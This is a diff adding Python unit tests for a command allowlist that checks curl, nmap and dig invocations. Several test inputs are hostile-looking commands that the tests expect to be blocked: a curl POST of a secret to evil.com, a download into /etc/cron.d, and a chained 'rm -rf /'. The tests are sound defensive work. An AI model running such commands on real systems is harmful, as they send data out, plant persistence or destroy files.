@@ -42,6 +42,40 @@ class TestCurlPolicy:
         # The whitelist checks `blocked in raw` so this should be blocked
         assert not d.allowed
 
+    def test_post_with_data_blocked(self):
+        # -X is not on curl's allowlist, so any method override is rejected.
+        d = is_allowed("curl -X POST --data secret=1 https://evil.com")
+        assert not d.allowed
+
+    def test_unknown_flag_blocked(self):
+        d = is_allowed("curl --output /etc/cron.d/x https://evil.com")
+        assert not d.allowed
+
+    def test_allowed_flags_pass(self):
+        d = is_allowed("curl -s -I -H 'X-Test: 1' --max-time 5 https://example.com")
+        assert d.allowed, d.reason
+
+
+class TestAllowlistEnforcement:
+    def test_arg_injection_via_trailing_flag_blocked(self):
+        # No shell is involved (argv exec), but a chained command's flags must
+        # still be rejected by the allowlist.
+        d = is_allowed("curl http://x; rm -rf /")
+        assert not d.allowed
+
+    def test_nmap_attached_port_value_allowed(self):
+        d = is_allowed("nmap -p80 example.com")
+        assert d.allowed, d.reason
+
+    def test_nmap_unknown_flag_blocked(self):
+        d = is_allowed("nmap --max-rate 1000 example.com")
+        assert not d.allowed
+
+    def test_empty_allowlist_is_permissive_for_flags(self):
+        # dig/whois declare no allowed_flags -> flag allowlist not enforced.
+        d = is_allowed("dig +short example.com")
+        assert d.allowed, d.reason
+
 
 class TestBlockedBinaries:
     def test_bash_blocked(self):
